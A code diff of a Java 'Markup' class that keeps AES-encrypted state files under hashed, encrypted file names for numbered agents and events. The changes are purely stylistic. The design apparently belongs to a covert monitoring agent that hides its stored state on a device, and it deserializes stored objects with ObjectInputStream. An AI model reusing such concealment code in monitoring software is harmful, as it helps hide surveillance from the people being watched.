@@ -43,7 +43,7 @@ public class Markup {
 
 	private String lognName;
 	private AutoFile file;
-	private Encryption encryption;
+	private final Encryption encryption;
 
 	private Markup() {
 		encryption = new Encryption(Keys.self().getAesKey());
@@ -61,7 +61,7 @@ public class Markup {
 		this();
 		agentId = agentId_;
 	}
-	
+
 	public Markup(final Integer id) {
 		this();
 		agentId = id.toString();
@@ -86,10 +86,13 @@ public class Markup {
 	 */
 	static String makeMarkupName(String agentId, final boolean addPath) {
 		// final String markupName = Integer.toHexString(agentId);
-		String markupName = Utils.byteArrayToHex(Encryption.SHA1(agentId
-				.getBytes()));
-		if(Cfg.DEBUG) Check.requires(markupName != null, "null markupName");
-		if(Cfg.DEBUG) Check.requires(markupName != "", "empty markupName");
+		final String markupName = Utils.byteArrayToHex(Encryption.SHA1(agentId.getBytes()));
+		if (Cfg.DEBUG) {
+			Check.requires(markupName != null, "null markupName");
+		}
+		if (Cfg.DEBUG) {
+			Check.requires(markupName != "", "empty markupName");
+		}
 
 		String encName = "";
 
@@ -97,10 +100,11 @@ public class Markup {
 			encName = Path.markup();
 		}
 
-		encName += Encryption.encryptName(markupName + MARKUP_EXTENSION,
-				getMarkupSeed());
+		encName += Encryption.encryptName(markupName + MARKUP_EXTENSION, getMarkupSeed());
 
-		if(Cfg.DEBUG) Check.asserts(markupInit, "makeMarkupName: " + markupInit);
+		if (Cfg.DEBUG) {
+			Check.asserts(markupInit, "makeMarkupName: " + markupInit);
+		}
 		return encName;
 	}
 
@@ -127,7 +131,9 @@ public class Markup {
 
 		final String markupName = makeMarkupName(value, true);
 
-		if(Cfg.DEBUG) Check.asserts(markupName != "", "markupName empty");
+		if (Cfg.DEBUG) {
+			Check.asserts(markupName != "", "markupName empty");
+		}
 
 		final AutoFile file = new AutoFile(markupName);
 		if (file.exists()) {
@@ -137,7 +143,7 @@ public class Markup {
 			return false;
 		}
 	}
-	
+
 	public static boolean removeMarkup(final Integer value) {
 		return removeMarkup(value.toString());
 	}
@@ -151,19 +157,23 @@ public class Markup {
 	public static synchronized int removeMarkups() {
 
 		int numDeleted = 0;
-		for (int type : AgentType.values()) {
+		for (final int type : AgentType.values()) {
 			if (removeMarkup(type)) {
 				numDeleted++;
 			} else {
-				if(Cfg.DEBUG) Check.log( TAG + " Error (removeMarkups): " + type);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Error (removeMarkups): " + type);
+				}
 			}
 		}
 
-		for (int type : EventType.values()) {
+		for (final int type : EventType.values()) {
 			if (removeMarkup(type)) {
 				numDeleted++;
 			} else {
-				if(Cfg.DEBUG) Check.log( TAG + " Error (removeMarkups): " + type);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Error (removeMarkups): " + type);
+				}
 			}
 		}
 
@@ -176,9 +186,13 @@ public class Markup {
 	 * @return true, if is markup
 	 */
 	public synchronized boolean isMarkup() {
-		if(Cfg.DEBUG) Check.requires(agentId != null, "agentId null");
+		if (Cfg.DEBUG) {
+			Check.requires(agentId != null, "agentId null");
+		}
 		final String markupName = makeMarkupName(agentId, true);
-		if(Cfg.DEBUG) Check.asserts(markupName != "", "markupName empty");
+		if (Cfg.DEBUG) {
+			Check.asserts(markupName != "", "markupName empty");
+		}
 
 		final AutoFile fileRet = new AutoFile(markupName);
 		return fileRet.exists();
@@ -197,10 +211,14 @@ public class Markup {
 	 *             Signals that an I/O exception has occurred.
 	 */
 	public synchronized byte[] readMarkup() throws IOException {
-		if(Cfg.DEBUG) Check.requires(agentId != null, "agentId null");
+		if (Cfg.DEBUG) {
+			Check.requires(agentId != null, "agentId null");
+		}
 
 		final String markupName = makeMarkupName(agentId, true);
-		if(Cfg.DEBUG) Check.asserts(markupName != "", "markupName empty");
+		if (Cfg.DEBUG) {
+			Check.asserts(markupName != "", "markupName empty");
+		}
 
 		final AutoFile fileRet = new AutoFile(markupName);
 
@@ -211,17 +229,22 @@ public class Markup {
 			byte[] plain = null;
 			try {
 				plain = encryption.decryptData(encData, len, 4);
-			} catch (CryptoException e) {
+			} catch (final CryptoException e) {
 				return null;
 			}
 
-			if(Cfg.DEBUG) Check.asserts(plain != null, "wrong decryption: null");
-			if(Cfg.DEBUG) Check.asserts(plain.length == len, "wrong decryption: len");
+			if (Cfg.DEBUG) {
+				Check.asserts(plain != null, "wrong decryption: null");
+			}
+			if (Cfg.DEBUG) {
+				Check.asserts(plain.length == len, "wrong decryption: len");
+			}
 
 			return plain;
 		} else {
-			if(Cfg.DEBUG) Check.log( TAG
-					+ " Error (readMarkup): Markup file does not exists");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error (readMarkup): Markup file does not exists");
+			}
 			return null;
 		}
 	}
@@ -230,10 +253,14 @@ public class Markup {
 	 * Removes the markup.
 	 */
 	public synchronized void removeMarkup() {
-		if(Cfg.DEBUG) Check.requires(agentId != null, "agentId null");
+		if (Cfg.DEBUG) {
+			Check.requires(agentId != null, "agentId null");
+		}
 
 		final String markupName = makeMarkupName(agentId, true);
-		if(Cfg.DEBUG) Check.asserts(markupName != "", "markupName empty");
+		if (Cfg.DEBUG) {
+			Check.asserts(markupName != "", "markupName empty");
+		}
 
 		final AutoFile remove = new AutoFile(markupName);
 		remove.delete();
@@ -254,7 +281,9 @@ public class Markup {
 	public synchronized boolean writeMarkup(final byte[] data) {
 		final String markupName = makeMarkupName(agentId, true);
 
-		if(Cfg.DEBUG) Check.asserts(markupName != "", "markupName empty");
+		if (Cfg.DEBUG) {
+			Check.asserts(markupName != "", "markupName empty");
+		}
 		if (!Path.haveStorage()) {
 			return false;
 		}
@@ -267,7 +296,9 @@ public class Markup {
 		if (data != null) {
 			final byte[] encData = encryption.encryptData(data);
 
-			if(Cfg.DEBUG) Check.asserts(encData.length >= data.length, "strange data len");
+			if (Cfg.DEBUG) {
+				Check.asserts(encData.length >= data.length, "strange data len");
+			}
 
 			fileRet.write(data.length);
 			fileRet.append(encData);
@@ -276,26 +307,27 @@ public class Markup {
 		return fileRet.exists();
 	}
 
-	public synchronized boolean writeMarkupSerializable(
-			final Serializable object) throws IOException {
+	public synchronized boolean writeMarkupSerializable(final Serializable object) throws IOException {
 
-		ByteArrayOutputStream bos = new ByteArrayOutputStream();
-		ObjectOutput out = new ObjectOutputStream(bos);
+		final ByteArrayOutputStream bos = new ByteArrayOutputStream();
+		final ObjectOutput out = new ObjectOutputStream(bos);
 		out.writeObject(object);
-		byte[] data = bos.toByteArray();
+		final byte[] data = bos.toByteArray();
 		return writeMarkup(data);
 
 	}
 
 	public synchronized Object readMarkupSerializable() throws IOException {
-		byte[] data = readMarkup();
-		ByteArrayInputStream bis = new ByteArrayInputStream(data);
-		ObjectInput in = new ObjectInputStream(bis);
+		final byte[] data = readMarkup();
+		final ByteArrayInputStream bis = new ByteArrayInputStream(data);
+		final ObjectInput in = new ObjectInputStream(bis);
 		try {
-			Object o = in.readObject();
+			final Object o = in.readObject();
 			return o;
-		} catch (ClassNotFoundException e) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error (readMarkupSerializable): " + e);
+		} catch (final ClassNotFoundException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error (readMarkupSerializable): " + e);
+			}
 			throw new IOException();
 		}
 	}
